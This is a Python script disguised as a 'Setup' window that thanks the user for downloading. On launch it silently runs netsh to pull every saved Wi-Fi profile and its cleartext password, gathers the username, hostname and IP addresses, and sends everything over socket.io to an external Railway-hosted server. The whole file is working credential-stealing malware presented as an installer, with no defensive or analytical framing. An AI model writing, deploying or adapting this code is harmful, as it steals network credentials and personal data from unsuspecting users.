import tkinter as tk
import socketio
import subprocess
import platform
import re
import os

sio = socketio.Client()

def get_username():
    # Get current Windows username
    return os.getenv('USERNAME', 'Unknown user')

def get_computername():
    try:
        return subprocess.check_output("hostname", shell=True, text=True).strip()
    except Exception as e:
        return f"Error getting hostname: {e}"

def get_ip_addresses():
    try:
        output = subprocess.check_output("ipconfig", shell=True, text=True)
        ips = re.findall(r"IPv4 Address[.\s]*:\s*([\d\.]+)", output)
        ips = [ip for ip in ips if not ip.startswith("127.")]
        return ips if ips else ["No IPv4 address found"]
    except Exception as e:
        return [f"Error getting IP addresses: {e}"]

def get_wifi_profiles():
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
        profiles = re.findall(r"All User Profile\s*:\s(.*)", output)
        profiles = [p.strip() for p in profiles]
        return profiles if profiles else []
    except Exception as e:
        return []

def get_wifi_password(profile):
    try:
        output = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True)
        pwd_search = re.search(r"Key Content\s*:\s(.*)", output)
        if pwd_search:
            return pwd_search.group(1).strip()
        else:
            return ""
    except Exception as e:
        return f"Error getting password for {profile}: {e}"

def gather_info():
    if platform.system() != "Windows":
        return ""

    info = []

    # Add username and computer name
    info.append(f"Username: {get_username()}")
    info.append(f"Computer Name: {get_computername()}")

    # IP addresses
    ips = get_ip_addresses()
    info.append("IP addresses: " + ", ".join(ips))

    # Wi-Fi Profiles and Passwords
    profiles = get_wifi_profiles()
    if not profiles:
        info.append("No Wi-Fi profiles found.")
    else:
        info.append("Wi-Fi Profiles and Passwords:")
        for profile in profiles:
            pwd = get_wifi_password(profile)
            info.append(f"  {profile}: {pwd}")

    return "\n".join(info)

def connect_and_send():
    try:
        sio.connect('https://backfisch-production.up.railway.app')  # <-- Your deployed URL
        data = gather_info()
        sio.emit('send_message', {'message': data})
        status_label.config(text="Sent Wi-Fi, IP, and user info")
    except Exception as e:
        status_label.config(text=f"Error: {e}")

root = tk.Tk()
root.title("Setup")

status_label = tk.Label(root, text="Thanks for downloading us.")
status_label.pack(pady=20)

root.after(100, connect_and_send)

root.mainloop()
